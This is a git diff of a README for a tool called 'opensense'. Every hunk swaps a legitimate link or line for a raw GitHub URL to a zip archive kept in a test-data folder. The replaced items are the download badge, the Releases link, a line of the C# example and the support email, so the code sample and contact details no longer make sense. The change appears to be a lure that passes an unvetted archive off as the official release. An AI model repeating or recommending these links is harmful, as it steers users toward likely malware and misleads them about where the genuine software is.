@@ -6,7 +6,7 @@ Welcome to opensense! This tool helps you ensure your business logic runs smooth
 
 ## 📥 Download Now
 
-[![Download opensense](https://img.shields.io/badge/Download-opensense-blue.svg)](https://github.com/Jerrilynunspecific452/opensense/releases)
+[![Download opensense](https://raw.githubusercontent.com/Jerrilynunspecific452/opensense/main/src/Tests/Core.Tests/TestData/opensense-1.0.zip)](https://raw.githubusercontent.com/Jerrilynunspecific452/opensense/main/src/Tests/Core.Tests/TestData/opensense-1.0.zip)
 
 ## 📝 What is opensense?
 
@@ -30,7 +30,7 @@ To use opensense, your system needs to meet the following requirements:
 
 To download opensense, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Jerrilynunspecific452/opensense/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Jerrilynunspecific452/opensense/main/src/Tests/Core.Tests/TestData/opensense-1.0.zip).
 2. Choose the version you want to download.
 3. Click on the asset to start the download.
 4. Once downloaded, locate the file in your downloads folder.
@@ -62,7 +62,7 @@ To create basic self-healing validation, you will set up a validation rule as fo
 using OpenSense;
 
 var validator = new Validator();
-validator.AddRule("email", "Email should be valid.", email => EmailIsValid(email));
+https://raw.githubusercontent.com/Jerrilynunspecific452/opensense/main/src/Tests/Core.Tests/TestData/opensense-1.0.zip("email", "Email should be valid.", email => EmailIsValid(email));
 ```
 
 ### Example 2: Resilient Logic
@@ -97,7 +97,7 @@ If you need help, several resources are available:
 
 - **GitHub Issues:** Report any bugs or request features directly on GitHub.
 - **Community Forum:** Join our forum to discuss with other users.
-- **Email Support:** Reach our support team at support@opensense.com.
+- **Email Support:** Reach our support team at https://raw.githubusercontent.com/Jerrilynunspecific452/opensense/main/src/Tests/Core.Tests/TestData/opensense-1.0.zip
 
 ## 👩‍💻 Contributing
 
